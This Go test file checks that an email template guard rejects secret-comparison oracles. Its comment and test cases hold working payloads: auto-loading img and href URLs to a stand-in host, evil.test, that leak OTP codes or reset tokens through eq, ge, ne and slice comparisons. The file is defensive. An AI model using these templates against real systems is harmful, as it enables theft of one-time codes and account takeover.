package email

import (
	"strings"
	"testing"
)

// The structural control-flow check refuses {{if eq .Code "…"}}, because a
// branch that waits for one live value is invisible to the two-canary
// differential. Emitting the comparison into the document is the same oracle
// without an {{if}}:
//
//	<img src="https://evil.test/c/{{eq .Code "000000"}}">
//
// Both canaries are long hex strings, so both renders write /c/false; the
// live six-digit OTP that equals the probe writes /c/true; checkEmailURL
// allows the constant https URL because no secret placeholder remains. One
// auto-loaded image per probe recovers the secret a bit at a time — the
// property the file comment says the guard exists to stop.

func TestGuardRefusesSecretComparisonOracles(t *testing.T) {
	oracles := []struct {
		name string
		src  string
	}{
		{
			name: "eq emitted into img src",
			src:  `<p>Reset</p><img src="https://evil.test/c/{{eq .Code "000000"}}">`,
		},
		{
			name: "ge binary-search probes in img src",
			src:  `<img src="https://evil.test/ge5/{{ge .Code "500000"}}">`,
		},
		{
			name: "slice+eq nibble probe in img src",
			src:  `<img src="https://evil.test/t0a/{{eq (slice .Token 0 1) "a"}}">`,
		},
		{
			name: "eq emitted into href",
			src:  `<a href="https://evil.test/x/{{eq .Token "nope"}}">Reset</a>`,
		},
		{
			name: "eq emitted into body text",
			src:  `<p>{{eq .Code "000000"}}</p>`,
		},
		{
			name: "ne emitted into img src",
			src:  `<img src="https://evil.test/n/{{ne .Code "111111"}}">`,
		},
	}
	for _, tc := range oracles {
		t.Run(tc.name, func(t *testing.T) {
			err := guardTemplate([]byte(tc.src))
			if err == nil {
				t.Fatalf("guardTemplate ACCEPTED a comparison oracle: %s", tc.src)
			}
			if !strings.Contains(err.Error(), "derives") && !strings.Contains(err.Error(), "decides on the value") {
				t.Fatalf("refused for the wrong reason: %v", err)
			}
		})
	}
}

func TestGuardStillAllowsVerbatimSecretActions(t *testing.T) {
	ok := []string{
		`<p>{{.Code}}</p>`,
		`<p>{{.Token}}</p>`,
		`<a href="{{.URL}}">Reset</a>`,
		`<a href="{{.URL | safeURL}}">Reset</a>`,
		`<a href="{{.URL | upper}}">Reset</a>`,
		`<p>{{.Code | lower}}</p>`,
	}
	for _, src := range ok {
		if err := guardTemplate([]byte(src)); err != nil {
			t.Fatalf("guardTemplate rejected legitimate verbatim secret use %q: %v", src, err)
		}
	}
}
